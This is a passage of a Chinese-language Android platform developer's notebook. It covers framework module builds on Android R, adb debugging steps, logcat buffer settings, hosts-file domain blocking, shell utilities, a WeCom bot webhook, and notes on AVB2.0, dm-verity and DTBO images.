3.执行root.bat，替换成功！
```

## Android 通过hosts屏蔽指定ip的网络访问

```text
通过指定对应ip的域名解析为localhost就可以屏蔽网络访问，以下是禁用讯飞输入法一些网络访问的例子：
hosts位置：

system/core/rootdir/etc/hosts

[plain]   view plain  copy
127.0.0.1                  localhost  
#Xunfei IME  
127.0.0.1                  ossp.voicecloud.cn  
127.0.0.1                  imeclient.openspeech.cn  
127.0.0.1                  iflytek.com  
127.0.0.1                  xunfei.cn  
127.0.0.1                  xfyun.cn  
127.0.0.1                  openspeech.cn  
127.0.0.1                  voicecloud.cn  
```

## AndroidR 修改framework后如何快速模块编译

```text
最近工作安排android大版本升级，需要将androidQ上的framework修改移植到androidR上。

移植后，整个工程全部make编译太耗费时间了，于是经验性的使用模块编译命令make framework进行模块单编。然而，虽然提示编译成功，但在out目录下并没有相应的framework.jar包生成。看来android11在此处进行了改动。

对比androidQ和androidR的frameworks/base/Android.bp文件，发现Android.bp文件做了不小的修改。

撷取其中一段对我们编译有帮助的配置及注释，如下：

java_library {
    name: "framework-minus-apex",
    defaults: ["framework-defaults"] ,
    srcs: [":framework-non-updatable-sources"] ,
    installable: true,
    javac_shard_size: 150,
    required: [
        "framework-platform-compat-config",
        "libcore-platform-compat-config",
        "services-platform-compat-config",
        "documents-ui-compat-config",
    ] ,
    libs: ["framework-updatable-stubs-module_libs_api"] ,
    static_libs: [
        // If MimeMap ever becomes its own APEX, then this dependency would need to be removed
        // in favor of an API stubs dependency in java_library "framework" below.
        "mimemap",
    ] ,
    // For backwards compatibility.
    stem: "framework",
    apex_available: ["//apex_available:platform"] ,
    visibility: [
        "//frameworks/base",
        // TODO(b/147128803) remove the below lines
        "//frameworks/base/apex/blobstore/framework",
        "//frameworks/base/apex/jobscheduler/framework",
        "//frameworks/base/packages/Tethering/tests/unit",
    ] ,
}

// This "framework" module is NOT installed to the device. It's
// "framework-minus-apex" that gets installed to the device. Note that
// the filename is still framework.jar (via the stem property) for
// compatibility reason. The purpose of this module is to provide
// framework APIs (both public and private) for bundled apps.
// "framework-minus-apex" can't be used for the purpose because 1)
// many apps have already hardcoded the name "framework" and
// 2) it lacks API symbols from updatable modules - as it's clear from
// its suffix "-minus-apex".
java_library {
    name: "framework",
    defaults: ["framework-aidl-export-defaults"] ,
    installable: false, // this lib is a build-only library
    static_libs: [
        "app-compat-annotations",
        "framework-minus-apex",
        "framework-updatable-stubs-module_libs_api",
    ] ,
    sdk_version: "core_platform",
    apex_available: ["//apex_available:platform"] ,
}
通过反复理解此bp文件，对谷歌工程师的想法似乎可以揣摩一二了。

于是尝试采用下面的模块编译命令（可以加-j8/-j16指定编译线程数）：

make framework-minus-apex
1
果不其然，顺利编译出了frameowrk.jar包：

[100% 1155/1155]  Install: out/target/product/PorjectAndroidR/system/framework/framework.jar
#### build completed successfully (04:50 (mm:ss)) ####


Android R之后编译services的命令还有效果，但是对于framework就有点力不从心了(因为编译规则已经改变了)，但是没有关系我们可以使用如下的命令进行相关的编译:
make -j8 framework-minus-apex
[100% 4845/4845]  Copy: out/target/product/bengal_32go/system/framework/arm/boot-framework.art

#### build completed successfully (10:45 (mm:ss)) ####


make -j8 services
[100% 359/359]  Copy: out/target/product/bengal_32go/system/framework/oat/arm/services.odex

#### build completed successfully (01:23 (mm:ss)) ####


#调试framework
#编译framework，Android 11和之前版本有所区别，
#此处不能使用make framework -j32 或者mmm framework/base -j32都是不行的
make  -j32 framework-minus-apex

adb root
adb remount
adb shell "rm -rf /system/framework/arm"
adb push framework.jar /system/framework
adb shell sync
adb reboot

#调试services
mmm framework/base/services -j32 或者 make -j32 services

adb root
adb remount
adb shell "rm -rf /system/framework/arm"
adb push services.jar /system/framework
adb shell "rm -rf /data/dalvik-cache/arm/system@framework@services.jar@classes.* "
adb shell sync
adb reboot
```

## Android ART模式不重新烧录system.img的情况下如何修改framework和app

```text
调试系统app
在user版本调试系统app应用(普通app应用能用IDE调试所以不在这个范围讨论之内)有两种方法：
(1).在android.mk里面加入一句话LOCAL_DEX_PREOPT := false，这个表示某个app不使用提前优化即不生成oat文件，生成apk这样就可以直接安装了

(2)不做优化，这里以XXX.apk为例，执行如下步骤

adb shell “rm  -rf  /system/app/XXX/* “
adb  shell “rm –rf /data/data/com.android.xxx”其中com.android.xxx为应用的包名
adb push  out\target\product\msm8909\system\app\XXX  /system/app/XXX
adb shell sync
adb reboot
现在就大功告成了,还有最好一种编译Android源码app会遇到的情况，就是当app下面有jni相关的目录或者so库相关的时候，使用上面的修改方法都不行了，譬如Browser应用，难道木有办法了吗，当然有那就是在Android.mk文件加入一句LOCAL__MODULE_TAGS = tests此时会有意向不到的效果出现。
```

## 解决Android logcat: Unexpected EOF!方法指南

```text
永久解决
上述第一种方法，在关机之后会失效，那么有没有永久有效的办法解决呢，当然有了，我们可以在shell状态下的setprop命令修改属性值，通过此方法可以使其在重启后仍然有效，具体修改的属性为persist.logd.size的值的大小，我们来尝试一下:

setprop persist.logd.size 8M
此时需要重新启动才能使设置生效！重启之后，我们一起来见证奇迹：

console:/ $ logcat  -g                                                         
main: ring buffer is 8 MiB (43 KiB consumed), max entry is 5120 B, max payload is 4068 B
system: ring buffer is 8 MiB (7 KiB consumed), max entry is 5120 B, max payload is 4068 B
crash: ring buffer is 8 MiB (0 B consumed), max entry is 5120 B, max payload is 4068 B
kernel: ring buffer is 8 MiB (0 B consumed), max entry is 5120 B, max payload is 4068 B
此时可以看到我们已经修改成功了。

至于永久有效，我们可以把上述命令固化在Android源码中，譬如init.rc等中就可以达到永久有效了。

这里还提供一种方法，我们也可以通过修改驱动层logcat的实现来达到修改缓冲区大小的功能！它的修改在/kernel/drivers/staging/android/logger.c中，如下：

static int __init logger_init(void)
{
    int ret;

    ret = create_log(LOGGER_LOG_MAIN, 128*1024);
    if (unlikely(ret))
        goto out;

    ret = create_log(LOGGER_LOG_EVENTS, 128*1024);
    if (unlikely(ret))
        goto out;

    ret = create_log(LOGGER_LOG_RADIO, 128*1024);
    if (unlikely(ret))
        goto out;

    ret = create_log(LOGGER_LOG_SYSTEM, 128*1024);
    if (unlikely(ret))
        goto out;

out:
    return ret;
}
这里我们可以修改create_log的第二个参数的大小，同样可以达到目的。刚兴趣的读者可以自行尝试一下。

上述的源码中，我在Android 11中并没有找到，可能Android 11的实现有所改变了，读者如果有了解的可以告知一下。
```

## TODO : 如何快速找到某个view所在的XML文件？

```text
在View中添加一个类似于TAG的属性，在解析所在的XML文件的时候设置这个属性，在 frameworks/base/core/java/android/view/LayoutInflater.java 中做如下修改
    public View inflate(@LayoutRes int resource, @Nullable ViewGroup root, boolean attachToRoot) {
        final Resources res = getContext().getResources();
        if (DEBUG) {
            Log.d(TAG, "INFLATING from resource: \"" + res.getResourceName(resource) + "\" ("
                  + Integer.toHexString(resource) + ")");
        }

         View view = tryInflatePrecompiled(resource, res, root, attachToRoot);
         if (view != null) {
+            view.setContentDescription(res.getResourceName(resource));
             return view;
         }
         XmlResourceParser parser = res.getLayout(resource);
         try {
-            return inflate(parser, root, attachToRoot);
+            View myTagView = inflate(parser, root, attachToRoot);
+            myTagView.setContentDescription(res.getResourceName(resource));
+            return myTagView;
         } finally {
             parser.close();
         }
    }
这里修改了源码，使用 description 来保存布局文件的名称

```

## 添加自定义属性myTag

```text
@Nullable
private String myTag;
/** @hide */
@UnsupportedAppUsage
public void setMyTag(@Nullable String tag) {
    this.myTag = tag;
}
/** @hide */
@Nullable
@ViewDebug.ExportedProperty
@InspectableProperty
public String getMyTag() {
    return myTag;
}

TODO : 这个方法目前有问题?
```

## view.setTag()的正确使用姿势

```text
开发中，我们经常要进行数据的传递，会使用到view.setTag()和view.getTag()方法，主要用在view的点击事件中，可以让数据跟着view走，这种方法很方便。一般情况下给view设置一个tag就够用了，某些情况下我们需要给一个view设置多个tag，在需要的时候再分别取出来，这就需要用到view.setTag()的一个重载方法view.setTag(int key,final Object Tag)了。
在view.setTag(key)方法的注释里面有这么一句：
The specified key should be an id declared in the resources of the application to ensure it is unique …
复制代码@throws IllegalArgumentException If they specified key is not valid
复制代码意思是说key必须是个唯一的资源id，就会报错。
好了，注意事项说完了，接下来该使用了。
①定义id，res/values/ids.xml文件下定义需要的id：
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <!-- 使用tag传递数据。 -->
    <item name="tag_txt_more_news" type="id"/>
    <item name="tag_txt_more_announce" type="id"/>
    <item name="tag_txt_more_report" type="id"/>
</resources>
复制代码②settag，添加数据
txMoreNews.setTag(R.id.tag_txt_more_news, newsCount)
复制代码③gettag获取数据并使用
int count = (int) v.getTag(R.id.tag_txt_more_news);
复制代码另外，view.setTag()/getTag()方法和view.setTab(key,value)/getTag(key)方法可以同时使用，他们的值不会冲突，view.setTag()添加的值是存在View对象的一个Object类型的成员变量里，而通过key添加的数据是存在一个SparseArray里面，他们的值不会发生冲突.
```

## [CMD] 看当前的界面fragments

```text
adb shell dumpsys activity top |grep "Added Fragments" -1
com.android.tv.settings.MainSettings.SETTINGS_FRAGMENT}
```

## [CMD] git 更快的搜索

```text
git grep -ni "netflix" frameworks/base/ packages/apps/ vendor/
```

## [CMD] git show --raw 展示上一个提交的文件列表

```text
git show --raw (commitid) 展示commitid里提交的文件列表
```

## [CMD] adb shell iw

```text
adb shell iw reg get //get country

adb shell iw reg set [country]   //set country

adb shell iw list  //get the support channel info
```

## [CMD] 设置cnss-daemon log级别

```text
adb shell setprop persist.vendor.cnss-daemon.debug_level 4
```

## [CMD] 如何统计项目代码行数

```text
find . "(" -name "*" ")" -print | xargs wc -l
1、打开终端，用cd命令 定位到工程所在的目录。

2、调用以下命令即可把每个源代码文件行数及总数统计出来
（1）包括空行（会列出每个文件的代码行数）：
find . "(" -name "*.m" -or -name "*.mm" -or -name "*.c" -or -name "*.h" -or -name "*.xib" -or -name "*.pch" ")" -print | xargs wc -l
（2）不包括空行（只会出现总行数）：
find . "(" -name "*.m" -or -name "*.mm" -or -name "*.c" -or -name "*.h" -or -name "*.xib" -or -name "*.pch" ")" -print | xargs grep -v "^$"|wc -l
//如果有其它.后缀文件可以继续添加如-or -name "*.java"

3、回车
grep -v "^$"去掉空行
注释也在代码行数统计之内
```

## android  修改手机联电脑，内部存储大小

```text
frameworks/av/media/mtp/MtpStorage.cpp
uint64_t MtpStorage::getMaxCapacity() {
    if (mMaxCapacity == 0) {
        struct statfs   stat;
        if (statfs(getPath(), &stat))
            return -1;
        mMaxCapacity = (uint64_t)stat.f_blocks * (uint64_t)stat.f_bsize;
    }
    // add 
 if (!mRemovable){
  mMaxCapacity = (uint64_t)8*1024*1024*1024; //8GB
 }
 // end
    ALOGD("MtpStorage mMaxCapacity = %lld \n", mMaxCapacity);
    return mMaxCapacity;
}
```

## TODO : acquire WakeLock 机制和闹钟机制的区别？

```text
TBD
```

## 判断触发按键的设备方法

```text
if (event.getSource() == InputDevice.SOURCE_GAMEPAD) {//手柄模式，其他自己看源码
}
```

## Handler Looper，如何查handlermessage 没有执行问题

```text
import android.util.LogPrinter;

Looper.prepare();
LogPrinter lp = new LogPrinter(Log.VERBOSE, TAG);
Looper.getMainLooper().setMessageLogging(lp);
添加以上代码。

在log中，查看

">>>>> Dispatching to xxx
<<<<< Finished to   xxx
是否成对出现，否则就是执行的handlermessage 有进行loop 状态或者堵塞 ， 导致其他的handlermessage 无法执行。 
```

## [知识点] 信号量+PV操作

```text
1、什么是信号量？
信号量（semaphore），我们有时被称为信号灯，是在多线程环境下使用的一种设施，是可以用来保证两个或多个关键代码段不被并发调用。信号量的数据结构为一个值和一个指针，指针指向等待该信号量的下一个进程。信号量的值与相应资源的使用情况有关。

一般来说，信号量S＞0时，S表示可用资源的数量。执行一次P操作意味着请求分配
一个单位资源，因此S的值减1；
当S<0时，表示已经没有可用资源，请求者必须等待别的进程释放该类资源，它才能运行下去。而执行一个V操作意味着释放一个单位资源，因此S的值加1；
若S＝0，表示有某些进程正在等待该资源，因此要唤醒一个等待状态的进程，使之运行下去。
温馨贴士：信号量的值只能由PV操作来改变。

２、PV操作：
自己通俗的理解， P就是请求资源，V就是释放资源。 P操作是减法运算（S:=S-1），当信号量S小于0时申请资源；V操作是加法运算（S:=+1），当信号量小于等于0时释放资源；P、V操作二者必须成对出现。
```

## [知识点] 奇偶校验

```text
奇偶校验#
奇校验：这串序列1的个数如果为偶数则在前面加个1，使1的个数变成奇数，否则加0。
偶校验：这串序列1的个数如果为奇数则在前面加个1，使1的个数变成偶数，否则加0。

例子：1111 奇校验就是 11111 偶校验就是 01111
1110 奇校验就是 01110 偶校验就是 11110

特性是检测一位错，无法纠错。
```

## python判断图片中含有另外一张图片

```text
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import cv2
import numpy as np
import matplotlib.pyplot as plt
scale = 1

img = cv2.imread('./auto.png')#要找的大图
img = cv2.resize(img, (0, 0), fx=scale, fy=scale)

template = cv2.imread('./image/water.png')#图中的小图
template = cv2.resize(template, (0, 0), fx=scale, fy=scale)
template_size= template.shape[:2] 

#找图 返回最近似的点
def search_returnPoint(img,template,template_size):
    img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    template_ = cv2.cvtColor(template,cv2.COLOR_BGR2GRAY)
    result = cv2.matchTemplate(img_gray, template_,cv2.TM_CCOEFF_NORMED)
    threshold = 0.7
    # res大于70%
    loc = np.where(result >= threshold)
    # 使用灰度图像中的坐标对原始RGB图像进行标记
    point = ()
    for pt in zip(*loc[::-1] ):
        cv2.rectangle(img, pt, (pt[0]  + template_size[1] , pt[1]  + + template_size[0] ), (7, 249, 151), 2)
        point = pt
    if point==():
        return None,None,None
    return img,point[0] + template_size[1]  /2,point[1] 

img,x_,y_ = search_returnPoint(img,template,template_size)
if(img is None):
    print("没找到图片")
else:
    print("找到图片 位置:"+str(x_)+" " +str(y_))
    plt.figure()
    plt.imshow(img, animated=True)
    plt.show()
```

## [Android]  网络工具 ethtool

```text
目前 Android 源码已经包含 ethtool 源码，ethtool 源码位置：/external/ethtool/

ethtool 编译，souce/lunch 后进入 ethtool 源码目录 mm 即可。

Output: /out/target/product/xxx/system/bin/ethtool

将其 push 到 板子上 /system/bin/ 即可使用。

ethtool 是用于查询及设置网卡参数的命令。

用法：
ethtool [ -a | -c | -g | -i | -d | -k | -r | -S |]  ethX
 
ethtool [-A]  ethX [autoneg on|off]  [rx on|off]  [tx on|off] 
 
ethtool [-C]  ethX [adaptive-rx on|off]  [adaptive-tx on|off]  [rx-usecs N]  
             [rx-frames N]  [rx-usecs-irq N]  [rx-frames-irq N]  [tx-usecs N]  
             [tx-frames N]  [tx-usecs-irq N]  [tx-frames-irq N]  [stats-block-usecs N] 
             [pkt-rate-low N]  [rx-usecs-low N]  [rx-frames-low N]  [tx-usecs-low N]  
             [tx-frames-low N]  [pkt-rate-high N]  [rx-usecs-high N]  [rx-frames-high N]  
             [tx-usecs-high N]  [tx-frames-high N]  [sample-interval N] 
 
ethtool [-G]  ethX [rx N]  [rx-mini N]  [rx-jumbo N]  [tx N] 
 
ethtool [-e]  ethX [raw on|off]  [offset N]  [length N] 
 
ethtool [-E]  ethX [magic N]  [offset N]  [value N] 
 
ethtool [-K]  ethX [rx on|off]  [tx on|off]  [sg on|off]  [tso on|off] 
 
ethtool [-p]  ethX [N] 
 
ethtool [-t]  ethX [offline|online] 
 
ethtool [-s]  ethX [speed 10|100|1000]  [duplex half|full]  [autoneg on|off]  
             [port tp|aui|bnc|mii]  [phyad N]  [xcvr internal|external] 
 
[wol p|u|m|b|a|g|s|d...]  [sopass xx:yy:zz:aa:bb:cc]  [msglvl N] 
```

## [cmd] shell分词统计

```text
https://leetcode-cn.com/problems/word-frequency/        leetcode192

cat words.txt | xargs -n1 | sort | uniq -c | sort -rn | awk '{print $2,$1}'
```

## Android packageManagerService如何添加安装权限白名单

```text
https://blog.csdn.net/myvest/article/details/54344076

Android R
frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java
private PrepareResult preparePackageLI(InstallArgs args, PackageInstalledInfo res) throws PrepareFailure {
    ...
    if ("in.zhaoj.shadowsocksrr".equalsIgnoreCase(pkgName)) {
        throw new PrepareFailure(INSTALL_FAILED_INVALID_APK, "Not allowed installing " + pkgName);
    }
    ...
}

开机扫描
```

## autojs原理

```text
这个软件的ui界面并不是由js写的。是这个软件提供了一个可以编写界面的js环境。这个软件本身的界面是由Java和Android XML编写的。
这是利用了AccessibilityService的API。参见AccessibilityService的getRootInActiveWindow()函数。
common模块提供了其他各个模块的公用类、工具等，例如一些数据结构、View工具类等。是其他各个模块的依赖。
automator模块实现了自动操作的大部分内容。包括选择器的实现、简单操作的实现、控件节点的封装等。是autojs模块的依赖。
autojs模块是Auto.js的JavaScript运行环境，包括脚本引擎的封装，核心运行库的实现，对JavaScript层暴露的API，JavaScript和Java的交互。同时提供了管理运行的JavaScript脚本的服务。
app模块是界面、业务逻辑。依赖autojs模块。
本项目主要需要Android基础，和uiautomator基础没有太大关系。
```

## 企业微信群机器人配置

```text
https://work.weixin.qq.com/api/doc/90000/90136/91770

添加群机器人:
右键群组->添加群机器人->新创建一个机器人->输入机器人名称->添加机器人->然后就会得到一个webhook的地址
ps:如果想要创建一个人的群，首先拉两个人创建一个三个人的群，再把其他两个人移除即可

curl 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=xxxxxxxxxxxxxxxxx' \
   -H 'Content-Type: application/json' \
   -d '
    {
        "msgtype": "markdown",
        "markdown": {
            "content": "实时新增用户反馈<font color=\"warning\">132例</font>，请相关同事注意。\n
             >类型:<font color=\"comment\">用户反馈</font>
             >普通用户反馈:<font color=\"comment\">117例</font>
             >VIP用户反馈:<font color=\"comment\">15例</font>"
        }
    }'
```

## jvmti + APM

## 离散傅里叶变换

```text
离散傅里叶变换（Discrete Fourier Transform，DFT）傅里叶分析方法是信号分析的最基本方法，傅里叶变换是傅里叶分析的核心，通过它把信号从时间域变换到频率域，进而研究信号的频谱结构和变化规律。
```

## 快速傅里叶变换

```text
快速傅里叶变换 (fast Fourier transform), 即利用计算机计算离散傅里叶变换（DFT)的高效、快速计算方法的统称，简称FFT。快速傅里叶变换是1965年由J.W.库利和T.W.图基提出的。采用这种算法能使计算机计算离散傅里叶变换所需要的乘法次数大为减少，特别是被变换的抽样点数N越多，FFT算法计算量的节省就越显著。
```

## [知识点] 固件

```text
固件（英语：firmware），是一种嵌入在硬件设备中的软件。通常它是位于特殊应用集成电路（ASIC）或可编程逻辑器件（PLD）之中的闪存或EEPROM或PROM里，有的可以让用户更新。可以应用在非常广泛的电子产品中，从遥控器、计算器到电脑中的键盘、硬盘，甚至工业机器人中都可见到它的身影。

顾名思义，固件的所在是位于软件和硬件之间的。像软件一样，他是一个被电脑所运行的程序。然而它是对于硬件内部而言更加贴近以及更加重要的部分，而对于外在的世界而言较无重要的意义。
```

## DTBO

```text
Android P上面对dtbo分区做了修改
1.Android P dtbo的变化
在android P上odmdtbo.img改名为dtbo.img(实际从android O MT6771上面已经修改)
从W1828 flashtool开始，下载时会校验dtbo.img，secure boot时lk会去校验dtbo.img

2.DTBO状态变化表

3.Android P dtbo格式介绍
(1)android P上面dtbo img使用android format，magic number也是特有的。
格式如下：
（2）dtbo header对应的结构体如下：
（3）android P上dtbo在build的时候会打包到recovery img里面，所以P上面boot header的结构体也会有变化（                      0x660的位置就是记录dtbo size的地方）

recovery img中dtbo所占的位置（dtbo offset：0xebf000）：

4.dtbo.img签名流程介绍
dtbo.img走的是MTK secure boot的sign/verify。
开启AVB之后的build流程，由于AOSP把dtbo加入了avb2.0，所以会先以avb的方式做sign。在执行mtk的sign tool的时候，会再次解析dtbo，把干净的dtbo.img剥离出来做mtk的sign。
dtbo的校验最终走的是mtk的secure boot，为了兼容AOSP的AVB2.0，MTK signtool有针对dtbo做特别的处理，所以android P上dtbo image需要使用android P上对应的脚本才可以。


AVB2.0 是google 设计的 verified boot 流程用于保护boot,recovery/system/vendor partion的完整性。每一个partion可以设置为hash或者是chain partion方式
更多AVB2.0的资讯，您可以参考google spec
https://android.googlesource.com/platform/external/avb/+/master/README.md
并且是Android R版本，AVB2.0是默认开启的
MTK默认的配置为：vendor,product,system为chain partion，其余为hash, 且recovery是独立于main vbmeta的存在。
R版本AVB2.0的相关配置
/vendor/mediatek/proprietary/bootable/bootloader/lk/target/${project}/inc/avbkey.h配置为下方oem_prvk.pem对应的public key（这个路径的key是用于校验vbmeta中的public key合法性)
/vendor/mediatek/proprietary/bootable/bootloader/lk/target/${project}/inc/avbkey_recovery.h配置为下方recovery_prvk.pem对应的public key（这个路径的key是用于校验recovery vbmeta中的public key合法性，因recovery独立于main vbmeta这里多出这个配置） 

alps/device/mediatek/common/device.mk
BOARD_AVB_ENABLE:=True
BOARD_AVB_ALGORITHM := SHA256_RSA2048
BOARD_AVB_KEY_PATH := device/mediatek/common/oem_prvk.pem
alps/vendor/mediate/proprietary/bootable/bootloader/lk/platform/${PLATFORM}/rules.mk
MTK_AVB20_SUPPORT=yes/no
alps/<kernel-dir>/drivers/misc/mediatek/masp/Kconfig
MTK_AVB20_SUPPORT default y

注意，dtbo不使用AVB2.0保护。build出来的dtbo是avb2.0签名方式，会在调用mtk签名脚本时将dtbo改为mtk签名方式。
除boot/recovery/system/vendor外其他的image(preloader,lk,logo,modem,tee等)仍然是使用mtk的verify flow
```

## 反编译dtbo.img到dts文件

```text
要用到两个工具：mkdtimg 和dtc
这两个工具在代码路径中都有，建议直接拷贝到/usr/bin目录下，以方便使用。
1.mkdtimg
在源码目录out/host/linux-x86/bin/mkdtimg
用法：mkdtimg dump dtbo.img -b
执行成功后会生成filename.0的二进制文件，其本质为dtd/dtbo文件。
2. dtc
在源码目录out/host/linux-x86/bin/dtc
dtc -I dtb -O dts <dtb_filename> -o <dts_filename>
执行成功生成dts文件。
```

## AVB(Android Verified Boot2.0)

```text
AVB的作用
AVB是android的一个非常重要的安全功能，主要是防止启动镜像被篡改，提高系统整体的抗攻击的能力，在启动的过程实现一整套的校验链，确保各个启动阶段是安全启动的。
验证程序用来保护用户使用软件在设备上运行的完整性。它通常从设备固件的只读部分开始，该部分加载代码并仅在密码验证代码是真实的且没有任何已知的安全缺陷之后执行。AVB是经过验证的引导的一种实现。

AVB在系统启动的哪些阶段工作？
AVB一般在bootloader阶段和INIT的第一阶段工作。

AVB在这两个阶段做了哪些事情？
AVB主要在Bootloader中校验vbmeta/vbmeta_system/boot/vendor_boot等分区，在init的第一阶段校验vbmeta/system/vendor等分区。

AVB工作原理大概是怎样的？
在bootloader或者UEFI中对vbmeta分区做校验，通过vbmeta中的descriptor描述符信息，去校验boot/vendor_boot等分区，同时获取系统中的device_status(locked or unlocked 即上锁或者未上锁)、boot_status(启动状态)、vbmeta中的加密的digest/加密算法/vbmeta大小等信息，append到kernel cmdline中；
然后启动kernel,kernel加载ramdisk运行init进程，进入init第一阶段，进行system/vendor分区的安全校验，会利用kernel cmdline中的值，跳过boot分区的校验；同时，因为system/vendor分区比较大，对大分区会执行hashtree的数据处理，将root digest等信息通过ioctl存到kernel中，后面访问数据时文件系统会执行dm-verity校验，执行运行时动态安全校验。

AVB对分区的处理是怎样的？
知道了其工作原理后，那google是如何设计框架的，对系统分区做了哪些设计呢？
首先，google想到了这样的设计：通过增加一个独立的分区，这个分区包括了其他分区的重要校验信息；只要保证这个vbmeta的足够安全，那么vbmeta中包含的其他分区的信息也就足够安全。
其次，这些安全的信息总不能用明文吧，所以得加密。用什么加密方式比较合适呢？google采用了RSA非对称加密，对镜像数据做RSA签名，将来在启动加载镜像分区时做公钥验证签名。一级级的保证各个分区的安全性。

vbmeta镜像内容说明：
在整个AVB验证的过程中，需要借助于vbmeta分区，需要增加vbmeta分区和vbmeta.img镜像。
vbmeta.img镜像，编译出来的大小为4KB
可使用avbtool提供的工具查看编译出来的vbmeta.img镜像内容：

./external/avb/avbtool info_image --image out/target/product/k80_bsp/vbmeta.img 
Minimum libavb version:   1.0
Header Block:             256 bytes
Authentication Block:     320 bytes
Auxiliary Block:          2752 bytes
Public key (sha1):        cdbb77177f731920bbe0a0f94f84d9038ae0617d
Algorithm:                SHA256_RSA2048
Rollback Index:           0
Flags:                    0
Release String:           'avbtool 1.1.0'
Descriptors:
    Chain Partition descriptor:
      Partition Name:          boot
      Rollback Index Location: 3
      Public key (sha1):       9d808b0995768d0677fccb1efcddb7cf9e153d99
    Chain Partition descriptor:
      Partition Name:          vbmeta_system
      Rollback Index Location: 2
      Public key (sha1):       fa41159a5d696abdef93176a07d0b0d001263f01
    Chain Partition descriptor:
      Partition Name:          vbmeta_vendor
      Rollback Index Location: 4
      Public key (sha1):       9577bc6c0772975ecce93c4d8a178662c728dadf
    Prop: com.android.build.dtbo.fingerprint -> 'Mobiwire/R_BB2/R_Common:11/RP1A.200720.011/1629696251:userdebug/release-keys'
    Hash descriptor:
      Image Size:            27829 bytes
      Hash Algorithm:        sha256
      Partition Name:        dtbo
      Salt:                  270e3c931e2b21c1177f837cbb3d099442dc5bb1f2b36674ab5293f2c0a1a969
      Digest:                4f54487139fa0245da4e7c4c282d31f683d14c80d055ed57111f06578ca94ec8
      Flags:                 0


Vbmeta的Descriptor的分类：
Chain Descriptor:       链式，vbmeta等分区数据少的分区。
Hash Descriptor:        hash哈希，boot等小分区。
Hashtree Descriptor:    dm-verity校验的大分区，像vendor


AVB中镜像的加密和解密过程，以boot.img镜像为例

编译制作boot.img时进行签名时，先通过SHA-256算法得到一个散列值digest（十六进制长度为64），然后用带RSA算法的私钥加密这个digest，并生成签名后和公钥一起加在镜像的footer尾部上，编译时也会将这个digest存一份到vbmeta.img镜像中。

在bootloader中加载boot镜像时，先从vbmeta.img镜像分区中读出boot
descriptor的digest，然后利用boot镜像中的公钥进行解密计算得到一个digest，和自己SHA-256计算得到的digest进行比较；
digest相等则说明boot.img是平台编译签名的，如果不相等，则boot.img可能是被篡改过的，boot启动失败。
最后再计算一次boot镜像内容的hash是否相等，hash不相等，启动也是失败。

sysmte/vendor镜像的编译
system/vendor镜像处理是类型的，因为这两个镜像一般都比较大，不能采用和boot.img镜像的add_hash_footer，如果在开机的时候对system/vendor整个内容进行hash计算，会比较耗时，所以google设计采用了hashtree的方式，计算整体分区最后只保证root digest hash和salt，只校验这两个值速度就比较快了。
```

## dm(Device Mapper)-verity？？

```text
Android 4.4 及更高版本支持通过可选的 device-mapper-verity (dm-verity) 内核功能进行启动时验证，以便对块存储设备进行透明的完整性检查。dm-verity 有助于阻止可以持续保有 Root 权限并入侵设备的持续性 Rootkit。验证启动功能有助于 Android 用户在启动设备时确定设备状态与上次使用时是否相同。
具有 Root 权限的可能有害的应用 (PHA) 可以躲开检测程序的检测，并以其他方式掩蔽自己。可以获取 Root 权限的软件就能够做到这一点，因为它通常比检测程序的权限更高，从而能够“欺骗”检测程序。
通过 dm-verity 功能，您可以查看块设备（文件系统的底部存储层），并确定它是否与预期配置一致。该功能是利用加密哈希树做到这一点的。对于每个块（通常为 4k），都有一个 SHA256 哈希。
由于哈希值存储在页面树中，因此顶级“根”哈希必须可信，才能验证树的其余部分。能够修改任何块相当于能够破坏加密哈希。下图描绘了此结构。

介绍如何打开/关闭dm-verity, 以及dm-verity key如何配置
[Solution]  
打开Dm-verity feauture，需打开AVB2.0，打开AVB2.0的方法可参考:  [FAQ24601]  How To enable AVB

Dm-verity enable steps as below:

1. /build/make/target/product/verity.mk
PRODUCT_SUPPORTS_BOOT_SIGNER := true 
PRODUCT_SUPPORTS_VERITY := true
PRODUCT_SUPPORTS_VERITY_FEC := true

2. /device/mediatek/common/device.mk
PRODUCT_SYSTEM_VERITY_PARTITION := /dev/block/by-name/system
PRODUCT_VENDOR_VERITY_PARTITION := /dev/block/by-name/vendor

3. /device/mediatekprojects/${PROJECT}/ProjectConfig.mk
MTK_DM_VERITY_OFF=no

4./vendor/mediate/proprietary/bootable/bootloader/lk/project/${PROJECT}.mk
MTK_DM_VERITY_OFF=no

5. Copy your own verity.pk8/verity.x509.pem/verity_key to following folder:
/build/make/target/product/security/verity

Note:
Copy verity.x509.pem to kernel/certs if:AB System enabled or System as root enabled
Because:  Ramdisk is moved to system, which can not be verified by the key stored in itself. Public key is moved to kernel instead.

Dm-verity Disable steps(如何关闭dm-verity):
1. alps/device/mediatekprojects/${PROJECT}/ProjectConfig.mk
MTK_DM_VERITY_OFF=no

2. alps/vendor/mediatek/proprietary/bootable/bootloader/lk/project/${PROJECT}.mk
MTK_DM_VERITY_OFF=no
```

## 编译 otapackage 之后刷机，无法开机

```text
if (DTBO_FROM_STANDALONE == get_dtbo_src()) {
 if (0 != img_auth_stor(get_dtbo_part_name(), NULL)) {
  pal_log_err("<ASSERT> %s:line %d\n", __FILE__, __LINE__);
  while (1);
 }
}

the odmdtbo.img does NOT exist, please check
secure boot signature generation bypassed for 'out/target/product/k80_bsp/dtbo.img'Sign Image 'out/target/product/k80_bsp/dtbo.img' with cfg 'vendor/mediatek/proprietary/custom/k80_bsp/security/image_auth/IMG_AUTH_CFG.ini'...
vendor/mediatek/proprietary/scripts/sign-image/SignTool vendor/mediatek/proprietary/custom/k80_bsp/security/image_auth/IMG_AUTH_KEY.ini vendor/mediatek/proprietary/custom/k80_bsp/security/image_auth/IMG_AUTH_CFG.ini out/target/product/k80_bsp/dtbo-verified.img out/target/product/k80_bsp/dtbo-verified.img.SIGNATURE out/target/product/k80_bsp/dtbo-verified.img.HEADER
```

## UEFI是什么？

```text
UEFI（Unified Extensible Firmware Interface)：全称“统一的可扩展固件接口”， 是一种详细描述全新类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上，从而使开机程序化繁为简，节省时间。

